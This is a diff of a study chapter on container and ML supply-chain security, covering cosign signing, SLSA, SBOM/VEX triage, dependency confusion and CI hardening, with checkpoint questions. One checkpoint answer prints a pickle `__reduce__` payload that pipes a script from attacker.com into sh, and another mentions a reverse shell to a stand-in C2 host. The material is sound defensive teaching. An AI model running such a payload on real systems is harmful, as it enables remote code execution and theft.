@@ -237,6 +237,10 @@ cosign sign --key gcpkms://... image@digest ; cosign verify --key gcpkms://.../v
 
 Principles: **sign digests, not tags**; define **who is allowed to sign** (identity = CI workflow path + ref, not "any signature"); keep a **private Sigstore** (Fulcio/Rekor/TUF) or key-based/KMS signing for air-gapped environments; protect signing keys in KMS/HSM; set certificate-identity policies tightly; record verification policy as code; sign **all** artefacts: images, Helm charts (OCI), SBOMs, attestations, Terraform modules, models.
 
+As *Production Kubernetes* Chapter 15 (*Software Supply Chain*) explains, early container signing with **Notary v1 (Docker Content Trust / TUF)** had two major operational pain points that modern **Sigstore (`cosign`)** and **Notary v2 (`notation`)** solved:
+1. **The Globally Unique Name (`GUN`) registry-URL coupling problem (`PK` Chapter 15):** Notary v1 bound each signature to a **Globally Unique Name (`GUN`)** that included the **registry hostname URL** (`registry-a.example.com/team/app`). Whenever an enterprise replicated or cached that exact same image digest across regional registries, edge pull-through caches, or air-gapped mirrors (`registry-b.internal/team/app`), Notary v1 signatures broke because the registry URL changed. By signing the **content-addressable image manifest digest (`@sha256:...`)** and storing signatures as OCI 1.1 artifacts/referrers inside the registry itself, `cosign` and `notation` allow signatures and SBOM attestations to travel seamlessly across mirrors and regional caches.
+2. **Push-Based vs. Pull-Based (GitOps) Deployments and Progressive Traffic Shifting (`Flagger`, `PK` Chapter 15):** After an image passes build, CVE scanning (`Clair` / `Trivy`), signing, and promotion to the `approved` registry, `PK` Chapter 15 recommends **pull-based GitOps controllers (`Flux` / `Argo CD`)** over push-based CI `kubectl apply` scripts (so CI never holds cluster-admin credentials), paired with **progressive delivery controllers (`Flagger` or `Argo Rollouts`)** that shift traffic gradually (`Canary`, `Blue/Green`, or `A/B Testing`) via Ingress/Gateway API or Service Mesh weights and automatically abort/roll back if error rates or latency degrade.
+
 ### Admission-time enforcement in Kubernetes
 
 Enforce verification where workloads are admitted (5.21):
@@ -357,7 +361,15 @@ Supply-chain controls fail eventually; limit the blast radius (5.15, 5.21):
 | **Verified** | SLSA L2–3 provenance; admission enforces signature + provenance; image promotion pipeline; VEX-driven triage; hermetic builds; egress allow-lists; signed models |
 | **Advanced** | Reproducible builds; policy on source reviews and dependency ages; GUAC/graph-based queries; runtime attestation (confidential computing/attested nodes); continuous verification and automated revocation; supplier attestation requirements |
 
-## 12. Lab (untested)
+## 12. Lab
+
+First, run the self-checking Python lab (`code/part05/supply_chain_policy_verifier_lab.py`) locally. It verifies the Sigstore/Cosign keyless OIDC signature and SLSA provenance verifier with `mutateDigest` (`verify_image_signature_and_mutate_digest`), the `PK` Chapter 15 quarantine-to-approved registry promotion and VEX CVE suppression engine (`evaluate_quarantine_image_promotion`), and the AI model (`safetensors` vs pickle) and Python `--require-hashes` / dependency-confusion auditor (`audit_ml_model_and_pip_supply_chain`).
+
+```bash
+python3 code/part05/supply_chain_policy_verifier_lab.py
+```
+
+Next, on a cluster with BuildKit, `cosign`, `syft`, `trivy`/`grype`, and Kyverno (all interactive shell steps below are `untested here`), work through these exercises:
 
 1. **Scan and SBOM**: build a PyTorch-based image; generate SPDX/CycloneDX SBOMs with Syft; scan with Trivy and Grype; compare findings; triage a CVE with VEX; show how a PyTorch-bundled CUDA library appears.
 2. **Hash-pinned Python**: create `requirements.in`, compile with hashes, install with `--require-hashes`; swap a wheel on a mirror to prove failure; configure a private index and demonstrate dependency confusion (in a sandbox) and the fix (single index, name reservation).
@@ -372,8 +384,6 @@ Supply-chain controls fail eventually; limit the blast radius (5.15, 5.21):
 11. **CI hardening review**: audit a GitHub Actions workflow set: unpinned actions, `pull_request_target`, broad `GITHUB_TOKEN`, secrets exposure; fix using SHA pins, least-privilege permissions, environment protections, OIDC; run `zizmor`/`actionlint`/Scorecard.
 12. **Policy as code tests**: unit-test Kyverno policies with `kyverno test` and fixtures in CI (4.13).
 13. **Clean up**.
-
-Mark tested only after execution.
 
 ## 13. Common mistakes
 
@@ -390,65 +400,195 @@ Mark tested only after execution.
 
 ## 14. Interview angles
 
-- "Walk me through securing the supply chain for container images in a Kubernetes cluster." 
-- "What is SLSA? What are provenance and attestations? How do you verify them in the cluster?" 
-- "How does cosign keyless signing work? What are Fulcio and Rekor?" 
-- "What's in an SBOM and how do you use it during a Log4Shell-type event?" 
-- "How do you defend against dependency confusion and typosquatting in Python?" 
-- "Why are pickled models dangerous? What are the alternatives and controls?" 
-- "How would you design an image promotion pipeline for third-party GPU images?" 
-- "How do you respond if a CI token was leaked and malicious images were pushed?" 
+- "Walk me through securing the supply chain for container images in a Kubernetes cluster."
+- "What is SLSA? What are provenance and attestations? How do you verify them in the cluster?"
+- "How does cosign keyless signing work? What are Fulcio and Rekor?"
+- "What's in an SBOM and how do you use it during a Log4Shell-type event?"
+- "How do you defend against dependency confusion and typosquatting in Python?"
+- "Why are pickled models dangerous? What are the alternatives and controls?"
+- "How would you design an image promotion pipeline for third-party GPU images?"
+- "How do you respond if a CI token was leaked and malicious images were pushed?"
 
-## 15. Checkpoint questions (40)
+## Exercises
 
-1. What does SLSA stand for? **A:** Supply-chain Levels for Software Artifacts.
-2. Build L3 means? **A:** Hardened platform with non-falsifiable provenance.
-3. in-toto is? **A:** Framework/format for signed supply-chain attestations.
-4. SBOM formats? **A:** SPDX, CycloneDX.
-5. SBOM tool? **A:** Syft.
-6. Scanner tools? **A:** Trivy, Grype.
-7. VEX purpose? **A:** State whether a CVE is exploitable in the product.
-8. Cosign signs what? **A:** OCI artefact digests.
-9. Keyless signing uses? **A:** OIDC identity + Fulcio cert + Rekor log.
-10. Rekor is? **A:** Transparency log.
-11. Notary v2 CLI? **A:** notation.
-12. Verify by what? **A:** Digest + expected identity/issuer.
-13. Admission enforcers? **A:** Kyverno, policy-controller, Ratify.
-14. `mutateDigest` does? **A:** Rewrite tags to digests.
-15. Why not trust tags? **A:** Mutable.
-16. Image promotion idea? **A:** Quarantine, scan, sign, promote.
-17. Dependency confusion? **A:** Public package shadows private name.
-18. `--require-hashes` does? **A:** Enforce hash-pinned installs.
-19. Safer file format for weights? **A:** safetensors.
-20. `weights_only=True` effect? **A:** Restricts unpickling.
-21. `trust_remote_code` risk? **A:** Runs repo-provided code.
-22. Model signing tools? **A:** model-signing (Sigstore), cosign.
-23. Reproducible build meaning? **A:** Same inputs yield identical output.
-24. Hermetic build? **A:** No uncontrolled network/inputs.
-25. BuildKit secret mount why? **A:** Keep secrets out of layers.
-26. CI hardening for third-party actions? **A:** Pin by SHA.
-27. `pull_request_target` risk? **A:** Runs with secrets on untrusted code.
-28. OIDC for CI benefit? **A:** No long-lived cloud keys.
-29. Registry immutability? **A:** Tags cannot be overwritten.
-30. Continuous rescan why? **A:** New CVEs appear after build.
-31. EPSS/KEV purpose? **A:** Exploit likelihood/known exploitation.
-32. Egress allow-list purpose? **A:** Block exfiltration/callbacks.
-33. Runtime detection tool? **A:** Falco/Tetragon.
-34. Inventory source for incident scope? **A:** SBOMs + running digests.
-35. Cosign revocation? **A:** None; use policy/key rotation.
-36. Referrers API? **A:** Attach signatures/SBOMs to images in OCI 1.1.
-37. NVIDIA toolkit CVEs matter because? **A:** Container escape risk.
-38. Dataset provenance practice? **A:** Version + hash datasets per run.
-39. ML-BOM? **A:** BOM extension for models/datasets.
-40. Why is rebasing all third-party/vendor container images onto a single corporate "golden" OS base image an antipattern, and what should you do instead? **A:** It breaks upstream dependencies/testing and creates maintenance backlog that delays security updates; instead, validate and scan upstream images through a quarantine-and-promotion pipeline into an approved internal registry.
+1. **The End-to-End AI Software Supply Chain Threat Model (`Source -> Build -> Dependencies -> Registry -> Deploy -> Runtime`):** Map the six attack vectors in Section 1 (`A1..A6`) to real-world supply-chain incidents (SolarWinds, Codecov, `xz`, dependency confusion, malicious pickle models, leaked CI tokens) and state the defensive control at each stage.
+2. **The Golden Base Images Antipattern, Cloud Native Buildpacks, and In-Cluster `Tekton` Build Pipelines (`PK` Chapter 15):** Using `evaluate_quarantine_image_promotion()` in `code/part05/supply_chain_policy_verifier.py`, explain why forcing teams to rebase all third-party/vendor images onto a single corporate OS base image fails (`PK` Ch. 15), how the Quarantine-to-Approved promotion pipeline replaces it, and trace the Tekton `git-clone` `Task`, `buildpacks-phases` `Task`, and `clone-and-buildpack` `Pipeline` manifests in Section 3.
+3. **`SLSA` Build Levels (`L1–L3`), `in-toto` Attestations, `SBOM`s (`SPDX`/`CycloneDX`), and `VEX`-Driven CVE Triage:** Explain the difference between SLSA Build L1, L2, and L3, how `Syft` generates SBOMs attached via `cosign attest --type spdxjson`, and how **VEX (`Vulnerability Exploitability eXchange`)** suppresses false-positive/un-exploitable CVE alerts with documented justification while blocking unmitigated fixable Critical/High CVEs.
+4. **Keyless Signing with `Sigstore` (`cosign`, `Fulcio`, `Rekor`), `Notary v1` `GUN` Limitations (`PK` Ch. 15), and Admission Enforcement (`Kyverno` `verifyImages`):** Using `verify_image_signature_and_mutate_digest()` in `code/part05/supply_chain_policy_verifier.py`, trace the `require-signed-images-and-provenance` Kyverno `ClusterPolicy` in Section 5, explaining how Fulcio binds a short-lived X.509 cert to the GitHub Actions OIDC token and logs it in Rekor, why Notary v1's Globally Unique Name (`GUN`) broke across registry mirrors (`PK` Ch. 15), and why `mutateDigest: true` is mandatory.
+5. **Securing the Python/CUDA Dependency Chain (`--require-hashes`, `--only-binary=:all:`, Private Index vs. `--extra-index-url` Dependency Confusion):** Using `audit_ml_model_and_pip_supply_chain()` in `code/part05/supply_chain_policy_verifier.py`, explain how a public PyPI package with a higher version number hijacks an internal package name when `--extra-index-url` is used, and design a hermetic multi-stage Python/CUDA build (`uv pip compile --generate-hashes` + `pip install --require-hashes --only-binary=:all:` + BuildKit `--network=none`).
+6. **AI Model and Dataset Supply Chain (`safetensors` vs. `pickle`, `weights_only=True`, `trust_remote_code=False`, OpenSSF `model-signing`) and Supply-Chain Incident Response:** Explain why Python `pickle` (`.pt`/`.bin`/`.pkl`) executes arbitrary code inside `__reduce__` during `torch.load()`, how `safetensors` and `model-signing` / OCI model artifacts (`ORAS`/`KitOps`) secure model weights, and walk through the 6-step incident response playbook in Section 10 for a zero-day CVE or leaked CI signing token.
 
-## 16. Sources and review notes
+## Checkpoint questions (20)
 
-**Written in original words.** Principal sources:
+<details>
+<summary>1. What is the difference between SLSA Build Level 1, Level 2, and Level 3?</summary>
 
-- Josh Rosso, Rich Lander, Alex Brand and John Harris, *Production Kubernetes* (`production-kubernetes`, Chapter 15: `15. Software Supply Chain` — read in full for the Golden Base Images Antipattern, distroless/Alpine Dockerfile pinning, quarantine registry promotion flow, and Tekton `git-clone` / `buildpacks-phases` `Task` and `Pipeline` examples).
-- SLSA specification, in-toto, Sigstore (cosign, Fulcio, Rekor), Notary Project, OpenSSF (Scorecard, model-signing), SPDX/CycloneDX, NIST SSDF, CNCF Software Supply Chain Best Practices, Kyverno/policy-controller/Ratify documentation, NVIDIA security bulletins.
-- Incident references are described at a class level without detailed claims; verify specifics before citing.
-- Examples are the author's constructions.
+- **SLSA Build L1 (Provenance Exists):** The build process automatically generates machine-readable provenance metadata (`https://slsa.dev/provenance/v1`) listing what inputs and commands produced the artifact, though it is not yet cryptographically protected against tampering on the build host.
+- **SLSA Build L2 (Hosted & Signed Provenance):** Builds run on a hosted build service (not a developer's laptop), and the build service cryptographically signs the provenance attestation so consumers can verify its authenticity.
+- **SLSA Build L3 (Hardened, Isolated Build Platform):** Builds run in **ephemeral, isolated environments** (one VM/sandbox per build, destroyed immediately afterward) where user-defined build steps **cannot access or forge the signing keys** used by the control plane to sign provenance (**non-falsifiable provenance**).
+</details>
 
-**Flagged for verification before publishing:** cosign/Kyverno policy syntax and attestation predicate type URIs for your versions, SLSA level definitions (the spec has evolved to tracks), Hugging Face/torch default behaviours for `torch.load` by version, tool names/flags for model signing and scanning, and every command/manifest; all labs are **untested**.
+<details>
+<summary>2. In *Production Kubernetes* Chapter 15, what is the "Golden Base Images Antipattern", and what architecture should replace it for third-party/vendor images?</summary>
+
+- **The Golden Base Images Antipattern:** Requiring platform or application teams to take every third-party or vendor container image (such as Postgres, Redis, Envoy, or NVIDIA NGC bases) and manually rebase/repackage its binaries onto a single corporate OS base image (e.g., a hardened corporate RHEL/CentOS image). This breaks upstream libc/library assumptions, duplicates upstream testing, and creates a massive maintenance bottleneck where images rarely get updated—leaving the cluster running *older, more vulnerable* software.
+- **The Replacement Architecture (`PK` Chapter 15):** Use curated minimal bases (`gcr.io/distroless/base` with `USER nonroot:nonroot` or pinned Alpine/Wolfi) for your own **first-party code**, and route **third-party/vendor images** through an automated **Quarantine-to-Approved Image Promotion Pipeline**: mirror the upstream digest into a `quarantine` repo -> run automated CVE/license/user-ID scans -> sign passing digests with your organization's key -> promote to the `approved` repo trusted by cluster admission.
+</details>
+
+<details>
+<summary>3. In `PK` Chapter 15, how do `Tekton` (`Task`, `Pipeline`, `Workspace`, `Results`) and `Cloud Native Buildpacks` (`/cnb/lifecycle/builder`) build container images inside Kubernetes without a privileged Docker daemon?</summary>
+
+- **Tekton:** Models CI/CD pipelines as Kubernetes CRDs (`Task`, `Pipeline`, `TaskRun`, `PipelineRun`). A `git-clone` `Task` clones the repository onto a PVC-backed **`Workspace`** (`shared-workspace`) and writes the exact Git commit SHA into **`$(results.commit.path)`** so downstream tasks and provenance generators consume the immutable commit SHA rather than a moving branch ref.
+- **Cloud Native Buildpacks (`buildpacks-phases` `Task` running `/cnb/lifecycle/builder`) / Kaniko / BuildKit rootless:** Detects the application language, compiles the source code, and assembles OCI image layers directly in user space and pushes the image to the registry—**never mounting `/var/run/docker.sock` or requiring `privileged: true` on the build node**.
+</details>
+
+<details>
+<summary>4. In `PK` Chapter 15, why did Notary v1 (`Docker Content Trust`) struggle in multi-registry and edge-cache environments, and how do `cosign` / `Notary v2 (notation)` solve it?</summary>
+
+Notary v1 identified every signed image by a **Globally Unique Name (`GUN`)** that embedded the **exact registry hostname URL** (`docker.io/acme/app`). If you mirrored or cached that image in an internal Harbor registry or regional pull-through cache (`harbor.internal/acme/app`), Notary v1 signature verification failed because the registry URL did not match the GUN.
+**`cosign` (Sigstore)** and **`notation` (Notary v2)** sign the **content-addressable SHA-256 manifest digest (`@sha256:...`)** and store the signature and attestations as **OCI 1.1 Referrers / artifacts** alongside the image layers—so copying an image across regional or air-gapped registries (`cosign copy` / `oras cp` / Harbor replication) preserves the cryptographic signature seamlessly.
+</details>
+
+<details>
+<summary>5. Walk through how `cosign` "Keyless Signing" works in GitHub Actions or GitLab CI using `OIDC`, `Fulcio`, and `Rekor`.</summary>
+
+1. **OIDC Identity Token:** The CI job requests a short-lived OpenID Connect (`OIDC`) JWT from the CI provider (`https://token.actions.githubusercontent.com`) whose claims prove the exact repository, workflow file path (`.github/workflows/release.yml`), and Git ref (`refs/tags/v1.2.0`).
+2. **Ephemeral Keypair & `Fulcio` Certificate:** `cosign sign` generates a one-time **ephemeral public/private keypair in memory** and sends the public key + OIDC JWT to **Fulcio** (Sigstore's Certificate Authority). Fulcio verifies the OIDC JWT and issues a **short-lived X.509 code-signing certificate (valid for ~10 minutes)** binding the ephemeral public key to the CI workflow's OIDC identity in the certificate's SAN extension.
+3. **Sign & Log in `Rekor`:** `cosign` signs the image digest with the ephemeral private key, records the signature and certificate in **Rekor** (an append-only, tamper-evident transparency log with a signed timestamp proving the signature was created while the 10-minute certificate was valid), and **immediately discards the ephemeral private key from memory**. No long-lived signing private key ever exists to be stolen.
+</details>
+
+<details>
+<summary>6. Why is verifying "any valid Cosign signature" (`subjectRegExp: ".*"`) a critical security mistake in a Kyverno or `policy-controller` admission rule?</summary>
+
+In public Sigstore keyless signing, **anyone on the internet with a GitHub, Google, or Microsoft account can obtain a valid Fulcio certificate for their own identity and sign any container image**. If your admission policy only checks that a valid Fulcio signature exists without restricting **`issuer`** (`https://token.actions.githubusercontent.com`) **AND `subject` / `subjectRegExp`** (`^https://github.com/acme/.+/.github/workflows/release\.yml@refs/tags/v.*$`), an attacker's personal GitHub workflow signature will pass admission. Always pin both the exact OIDC `issuer` and your organization's trusted workflow `subjectRegExp`.
+</details>
+
+<details>
+<summary>7. What is an `in-toto` Attestation (`DSSE`), and how does it differ from a plain image signature?</summary>
+
+- **Plain image signature (`cosign sign`):** Only proves: *"Identity X signed image digest `sha256:abc...`."*
+- **`in-toto` Attestation (`cosign attest`, wrapped in a Dead Simple Signing Envelope `DSSE`):** A signed, structured JSON statement binding a **Subject** (the image digest `sha256:abc...`) to a typed **Predicate** containing verifiable metadata about the artifact, such as:
+  - **`https://slsa.dev/provenance/v1`:** Exact Git commit SHA, builder ID, workflow inputs, and build timestamps.
+  - **`https://spdx.dev/Document` or `https://cyclonedx.org/bom`:** Full Software Bill of Materials (SBOM).
+  - **`https://cosign.sigstore.dev/attestation/vuln/v1`:** Signed vulnerability scan report.
+Admission controllers (Kyverno `attestations.conditions`) can inspect fields inside the signed predicate (e.g., requiring `buildDefinition.buildType` and `resolvedDependencies` to match corporate policy) before admitting a Pod.
+</details>
+
+<details>
+<summary>8. Compare `SPDX` and `CycloneDX` SBOM formats, and explain how an SBOM + `VEX` (Vulnerability Exploitability eXchange) work together during CVE triage.</summary>
+
+- **`SPDX` (Linux Foundation / ISO/IEC 5962)** and **`CycloneDX` (OWASP, with native `ML-BOM` and `VEX` extensions)** are the two standard machine-readable SBOM formats listing every OS package, Python wheel, Go module, and shared library inside an image.
+- **How `VEX` prevents alert fatigue:** A 15 GB PyTorch/CUDA image often contains hundreds of OS/library packages that a scanner flags with CVEs—even when the vulnerable function is never called or the CLI tool is unreachable at runtime. Instead of disabling the scanner or ignoring all alerts, security engineers publish a signed **VEX document (`OpenVEX` / `CycloneDX VEX`)** marking specific `(image_digest, CVE-ID)` pairs as **`not_affected`** with a machine-readable justification (`component_not_present`, `vulnerable_code_not_in_execute_path`), so CI and registry gates automatically suppress known non-exploitable findings while still blocking new real CVEs.
+</details>
+
+<details>
+<summary>9. Why do standard container CVE scanners (`Trivy`, `Grype`, `Clair`) sometimes miss vulnerable C/C++/CUDA libraries inside AI/ML images, and how do you address it?</summary>
+
+Standard scanners primarily inspect **OS package manager databases** (`/var/lib/dpkg/status`, `/var/lib/rpm`) and **language metadata files** (`*.dist-info/METADATA` in Python `site-packages`). However, in AI/ML containers:
+- Large Python wheels (`torch`, `triton`, `flash-attn`, `tensorrt`) **bundle statically linked or vendored `.so` shared libraries** (`libcudnn.so`, `libnccl.so`, `libssl.so`) inside the wheel without registering them in `dpkg`/`rpm`.
+- Custom C++/CUDA extensions compiled from source leave no package manager record.
+**Mitigations:** Use `syft` / `trivy` binary/file analyzers, generate SBOMs *during* the build process where all source/wheel inputs are known, and rebuild atop patched vendor base images (`nvcr.io/nvidia/pytorch:24.xx`) on a monthly cadence.
+</details>
+
+<details>
+<summary>10. Explain the "Dependency Confusion" attack on Python `pip` installs, and why passing `--extra-index-url` to an internal PyPI server is dangerous.</summary>
+
+Suppose your company has an internal private Python package named `acme-llm-utils==1.2.0` hosted on your internal index, and a Dockerfile runs:
+`pip install --extra-index-url https://pypi.internal.acme.com/simple acme-llm-utils`
+Because `--extra-index-url` tells `pip` to query **BOTH public `pypi.org` AND your internal index and install whichever index offers the HIGHEST version number**, an attacker who registers `acme-llm-utils==99.0.0` on public `pypi.org` causes `pip` to download and execute the attacker's public package instead of your internal `1.2.0` package.
+**Three mandatory defenses:**
+1. **Never use `--extra-index-url`:** Use **`--index-url https://pypi.internal.acme.com/simple`** pointing *exclusively* to your internal repository manager (Artifactory / Nexus / devpi), which proxies vetted public packages and blocks external shadowing of internal prefixes.
+2. **Use `--require-hashes` with hash-pinned lockfiles (`uv pip compile --generate-hashes`):** Any wheel whose SHA-256 hash does not match the lockfile is rejected immediately.
+3. **Use `--only-binary=:all:`:** Forbids `pip` from downloading source tarballs (`sdist`) and executing arbitrary `setup.py` code during installation.
+</details>
+
+<details>
+<summary>11. Why is loading a PyTorch checkpoint with default `torch.load("model.pt")` (Python `pickle`) a Remote Code Execution (`RCE`) vulnerability, and what are the three safe alternatives?</summary>
+
+Traditional PyTorch `.pt` / `.bin` / `.pkl` files are **Python `pickle` streams**. The `pickle` virtual machine allows any pickled object to define a **`__reduce__` method** specifying an arbitrary Python callable and arguments—such as `(os.system, ("curl https://attacker.com/shell.sh | sh",))`—which executes **the instant `torch.load()` unpickles the file**, before the model is even returned.
+**Three safe practices:**
+1. **Use `safetensors` (`model.safetensors`, Hugging Face / MLCommons standard):** Stores a plain JSON header (tensor names, dtypes, shapes, byte offsets) followed by raw flat tensor bytes. **Zero code execution is possible by design**, and weights can be zero-copy `mmap`-loaded directly to CPU/GPU.
+2. **Pass `weights_only=True` in `torch.load("model.pt", weights_only=True)`** (default in PyTorch 2.6+), which restricts the unpickler to primitive tensor data types only.
+3. **Scan untrusted model artifacts in quarantine** with **`modelscan` / `fickling`** before promotion.
+</details>
+
+<details>
+<summary>12. What does `trust_remote_code=True` in Hugging Face `transformers` (`AutoModel.from_pretrained(..., trust_remote_code=True)`) do, and how do you govern it?</summary>
+
+When `trust_remote_code=True` is passed, `transformers` downloads and **executes custom `.py` modeling/tokenizer files directly from the remote model repository** (`modeling_custom.py`). Even if the model weights are stored in `safetensors`, a malicious or compromised upstream commit in that `.py` file executes arbitrary code inside your training or inference container.
+**Governance:**
+- Never allow `trust_remote_code=True` against mutable branch refs (`main`) or public internet hubs at runtime.
+- Mirror required model repos into your internal artifact store **pinned to an exact audited Git commit SHA (`revision="a1b2c3d..."`)**, review any `.py` files in the repo during quarantine promotion, and block direct internet egress to `huggingface.co` from production namespaces.
+</details>
+
+<details>
+<summary>13. How do you sign and verify ML model weights and datasets using `OpenSSF model-signing` or OCI Model Artifacts (`ORAS` / `KitOps`)?</summary>
+
+Two complementary approaches:
+1. **OpenSSF `model-signing` (Sigstore):** Computes a cryptographic Merkle tree / manifest hash over every file in a model directory (`model.safetensors`, `config.json`, `tokenizer.json`), signs the manifest via Sigstore (`Fulcio`/`Rekor` or KMS key), and verifies the signature before the model server loads the directory.
+2. **OCI Model Artifacts (`ORAS`, `KitOps`, or Kubernetes `image` volumes):** Packages model weights as OCI layers pushed to your container registry (`registry.example.com/models/llama-3-70b@sha256:...`), signed with **`cosign sign`**, and verified at Pod admission by the exact same Kyverno `verifyImages` policy used for container images.
+</details>
+
+<details>
+<summary>14. Why must admission policies (`verifyImages`) check `initContainers` and `ephemeralContainers` in addition to `spec.containers`?</summary>
+
+`initContainers` and `ephemeralContainers` (`kubectl debug`) run inside the **exact same Pod network namespace, mount the exact same Secret/PVC volumes, and use the exact same `ServiceAccount` token** as `spec.containers`. If an admission policy only validates `spec.containers`, an attacker can put a benign signed `pause` image in `spec.containers` and put an unsigned malicious image inside `spec.initContainers` (or attach an unsigned `ephemeralContainer`) to steal Secrets and data. Kyverno's `verifyImages` rule checks `containers`, `initContainers`, and `ephemeralContainers` by default—never disable those checks.
+</details>
+
+<details>
+<summary>15. What are the two most dangerous GitHub Actions CI misconfigurations (`pull_request_target` and unpinned third-party Actions), and how do you fix them?</summary>
+
+1. **`on: pull_request_target` checking out untrusted fork PR code:** Unlike `on: pull_request` (which runs with a read-only token and no secrets on fork PRs), `pull_request_target` runs in the context of the base repository **with write permissions and access to repository secrets**. If a workflow triggered by `pull_request_target` checks out and builds/tests the PR's head commit (`ref: ${{ github.event.pull_request.head.sha }}`), an external attacker opening a PR can exfiltrate all CI secrets and push malicious images.
+2. **Referencing third-party GitHub Actions by mutable tag (`uses: some-org/action@v2`):** If `some-org` is compromised (like the `tj-actions/changed-files` incident), the attacker moves the `@v2` tag to malicious code that steals runner memory/secrets. **Always pin third-party Actions to a full 40-character immutable Git commit SHA** (`uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2`) and audit workflows with **`zizmor`** and **`OpenSSF Scorecard`**.
+</details>
+
+<details>
+<summary>16. How do you make a `Docker BuildKit` compile step hermetic (`RUN --network=none`), and why does it matter?</summary>
+
+In a multi-stage `Dockerfile`:
+1. **Stage 1 (`fetch`):** Downloads dependencies exclusively from your internal hash-verified mirror/proxy.
+2. **Stage 2 (`build`):** Copies the fetched wheels/sources from Stage 1 and runs compilation with **`RUN --network=none pip install --no-index --find-links=/wheels --require-hashes -r requirements.txt`** (and `RUN --network=none make`).
+Because `--network=none` unshares a network namespace with **only a loopback interface and zero external routes**, even if a compromised build script or compiler macro attempts to download a second-stage payload or exfiltrate source code during compilation, the network call fails immediately with `ENETUNREACH`.
+</details>
+
+<details>
+<summary>17. In *Production Kubernetes* Chapter 15, why is Pull-Based GitOps (`Argo CD` / `Flux`) more secure for the software supply chain than Push-Based CI (`kubectl apply` from Jenkins/GitHub Actions)?</summary>
+
+In a **Push-Based CI pipeline**, the CI server must hold **long-lived `cluster-admin` (or broad write) kubeconfig credentials** for every production Kubernetes cluster. If any build job, third-party CI plugin, or runner in the CI system is compromised, the attacker immediately gains direct write access to production clusters.
+In a **Pull-Based GitOps architecture (`PK` Chapter 15)**, the CI pipeline only builds, scans, and signs the container image (and opens a PR bumping the image digest in the deployment Git repo). The **GitOps controller (`Argo CD` / `Flux`) running inside the cluster** pulls reviewed commits from Git—so **zero cluster credentials ever exist in CI**, and every deployment requires a signed, reviewed Git commit.
+</details>
+
+<details>
+<summary>18. How do Runtime Security Controls (`readOnlyRootFilesystem: true`, Default-Deny Egress `NetworkPolicy`, and `Falco`/`Tetragon`) contain a compromised Python dependency that slipped past build checks?</summary>
+
+Suppose a zero-day malicious dependency inside a training container executes at import time:
+1. **`readOnlyRootFilesystem: true` + `allowPrivilegeEscalation: false` + `drop: ["ALL"]`:** The payload cannot modify `/usr`, `/lib`, or Python `site-packages` to persist itself, and cannot escalate privileges.
+2. **Default-Deny Egress `NetworkPolicy`:** When the payload tries to open a reverse shell or POST stolen environment variables/weights to `https://attacker-c2.example.com`, the packet is **dropped at the CNI `veth`/eBPF filter** and logged in Hubble.
+3. **`Tetragon` / `Falco` eBPF Runtime Detection:** Immediately detects the anomalous process tree (`python3 -> /bin/sh -> curl`) or unexpected file read (`/var/run/secrets/...`) and fires a high-priority security alert (or kills the process synchronously via Tetragon `TracingPolicy` `Sigkill` enforcement).
+</details>
+
+<details>
+<summary>19. Since Sigstore `cosign` keyless signatures use short-lived 10-minute certificates that have already expired by the time the image runs in production, how do you "revoke" trust in a compromised build or leaked CI workflow?</summary>
+
+In keyless Sigstore, a signature remains valid forever as long as its Rekor transparency-log timestamp falls within the Fulcio certificate's 10-minute validity window. Therefore, if a CI run was compromised and signed a malicious image digest `sha256:bad123...`:
+1. **Block the specific compromised image digest(s)** immediately in your Kyverno / `policy-controller` admission deny-list and delete/quarantine the digest in your internal registry.
+2. **If a KMS/keypair signing key was leaked:** Rotate to a new KMS key version (`versions/2`), update admission policies to trust only `versions/2`, and re-sign current approved production digests.
+3. **If a keyless CI workflow was vulnerable before timestamp $T$:** Update the admission policy's `attestations.conditions` (or workflow path/tag pattern) to require provenance generated after the fix commit/timestamp.
+</details>
+
+<details>
+<summary>20. During a "Log4Shell" or "xz"-style zero-day vulnerability disclosure, how do you identify every affected Pod across 10 GPU clusters in under 15 minutes?</summary>
+
+Instead of slow, ad-hoc node scanning across thousands of running containers:
+1. Query your **running image digest inventory** (`kubectl get pods -A -o jsonpath='{..imageID}'` or Prometheus `kube_pod_container_info`) to get the set of active `sha256:...` digests in every cluster.
+2. Query your central **SBOM inventory database (`Dependency-Track`, `GUAC`, or OCI Registry SPDX/CycloneDX attestations)** for any SBOM containing `package == "xz" && version in ["5.6.0", "5.6.1"]`.
+3. Intersect the two sets to produce an instant, exact list of `(cluster, namespace, deployment, pod, owner_team)` running the vulnerable library, create VEX/patch tickets, and trigger automated base-image rebuilds.
+</details>
+
+## Sources and review notes
+
+- **Sources read in full:**
+  - `production-kubernetes` — Josh Rosso, Rich Lander, Alexander Brand & John Harris, *Production Kubernetes*, **Chapter 15: Software Supply Chain** (read in full: multi-stage Dockerfile with `gcr.io/distroless/base` and `USER nonroot:nonroot`, Cloud Native Buildpacks `pack`, the Golden Base Images Antipattern, Tekton `git-clone` and `buildpacks-phases` `Task` and `Pipeline` manifests, container registries and `Clair`/`Trivy` CVE scanning, Notary v1 Globally Unique Name `GUN` limitations across mirrors, the Quarantine-to-Approved image promotion workflow, and Push-based vs Pull-based GitOps deployments with `Flagger` progressive delivery).
+- **Run here:** `python3 code/part05/supply_chain_policy_verifier_lab.py` (3 passed, 0 failed).
+- **Explicitly labelled inferences:** The `verify_image_signature_and_mutate_digest`, `evaluate_quarantine_image_promotion`, and `audit_ml_model_and_pip_supply_chain` models in `code/part05/supply_chain_policy_verifier.py` and the `require-signed-images-and-provenance` Kyverno `ClusterPolicy` and Quarantine-to-Approved promotion diagram are the author's constructions synthesizing `PK` Chapter 15 and SLSA/Sigstore/SPDX/CycloneDX/OpenSSF standards (plus original study items 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, and 40).
+- **Not verified on live hardware:** Live `cosign`, `syft`, `trivy`, `grype`, `slsa-verifier`, `modelscan`, and `Tekton` executions (`L1-L3` SLSA, `SP 800-218`, `EO 14028`, `OCI 1.1`, `alpine:3.12`, `imagemagick=7.0.10.25-r0`, `git-init:v0.12.1`, `webhookTimeoutSeconds: 15`, `torch 2.6`) are marked (`untested here`) where not executed by `supply_chain_policy_verifier_lab.py`.
